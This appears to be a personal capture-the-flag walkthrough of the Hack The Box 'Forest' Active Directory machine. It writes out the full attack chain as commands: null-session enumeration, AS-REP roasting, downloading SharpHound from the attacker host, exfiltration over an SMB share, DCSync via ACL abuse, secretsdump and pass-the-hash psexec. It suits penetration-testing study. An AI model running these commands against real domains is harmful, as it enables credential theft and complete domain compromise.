ya bissmillah , first box in playlist 

as any box we will start with nmaP

`sudo nmap -sC -sV -p-  -T4 10.10.10.161 -oN FOREST` 
![[Pasted image 20240522201952.png]]
kerberos ,ldap ,smb, rpc   that's a DC but without DNS (port 53 ) which is weird

let's check null session agains smb and ldap and rpc

`ldap null session is allowed  nxc ldap 10.10.10.161  -u '' -p ''  --users`
![[Pasted image 20240522202946.png]]====

==we can enumerate users with null session and rpc ==
![[Pasted image 20240522203256.png]]

nothing for smb until now 

let's create a wordlists and try asreproasting
`rpcclient 10.10.10.161 -U  '' -N -c  enumdomusers | cut -d '[' -f 2 | cut -d ']' -f 1`
![[Pasted image 20240522204005.png]]


==asreproasting==
`nxc ldap 10.10.10.161  -u users.txt -p ''  --asreproast asreproast `
![[Pasted image 20240522204136.png]]

==hashcat==
using rockyou.txt
![[Pasted image 20240522204214.png]]

enumerate using ==ldapdomaindump==
`python3 ldapdomaindump.py --user 'HTB\svc-alfresco' --password s3rvice --outdir ldapdomaindump 10.10.10.161`
![[Pasted image 20240522213314.png]]

if we took a look on the user ==svc-alfresco==
![[Pasted image 20240522213429.png]]
![[Pasted image 20240522213602.png]]

our group is member of the group , ==Remote Management Users== 
so we can use ==evil-winrm== to login
`evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice
`
![[Pasted image 20240522213808.png]]

when I got creds , I tried bloodhound-python but that didn't work because of the stupid DNS
now I will use sharphound.exe
![[Pasted image 20240522214203.png]]
on the windows box 
`wget -Uri http://10.10.14.15/SharpHound.exe -Outfile SharpHound.exe`

![[Pasted image 20240522214319.png]]

`.\SharpHound.exe -c all`
![[Pasted image 20240522214543.png]]

now we have bloodhound.zip files , let's move it to our machine , the easiest way  to do that is by hosting a smbserver using impacket

`impacket-smbserver -smb2support share .`
![[Pasted image 20240522214723.png]]

`move 20240522135040_BloodHound.zip \\10.10.14.15\share` 
and we should have the file on our machine 


now we could use bloodhound  
great article about setting up bloodhound  https://blog.spookysec.net/Deploying-BHCE/

![[Pasted image 20240522221736.png]]

the ==genericall== we could use it to add our user to the exchange group
![[Pasted image 20240522221909.png]]

`net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "d0s3nt" -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "10.10.10.161"`

![[Pasted image 20240522222023.png]]
we could check using 
`net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "10.10.10.161"`
![[Pasted image 20240522222059.png]]

we can use ==WriteDacl== to add ourself the necssary ACL to perform DCSync

![[Pasted image 20240522222628.png]]
setting Up this tool was nightmare, I fellow this  https://www.youtube.com/watch?v=O_VeRoT1f1k
I found the script here https://github.com/ShutdownRepo/impacket/blob/04518279ef663e80195b61d4d864d6e9e8ac5d9f/examples/dacledit.py

`dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'svc-alfresco':'s3rvice'`
![[Pasted image 20240522222912.png]]
nb : if it didn't work re run the net rpc command to add the user to the exchange groupe again
`impacket-secretsdump HTB.LOCAL/svc-alfresco:s3rvice@10.10.10.161`
![[Pasted image 20240522223613.png]]
using the hash we could get shell as SYSTEM using psexec

`impacket-psexec HTB.LOCAL/administrator@10.10.10.161 -hashes: 32693b11e6aa90eb43d32c72a07ceea6`
![[Pasted image 20240522224115.png]]


if we are in a real word scenario we could backtrack our modification by 
`dacledit.py -action 'remove' -rights 'DCSync' -principal 'svc-alfresco'-target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'svc-alfresco':'s3rvice'`

when I was doing the box powerview function `Add-DomainObjectAcl` didn't work and hang on evil-wirm without response after watching ippsec , seems that the command on bloodhound graphing tool wasn't correct which is weird 

this should work  https://burmat.gitbook.io/security/hacking/domain-exploitation
``Add-DomainObjectAcl -TargetIdentity "DC=burmatco,DC=local" -PrincipalIdentity useracct1 -Rights DCSync``
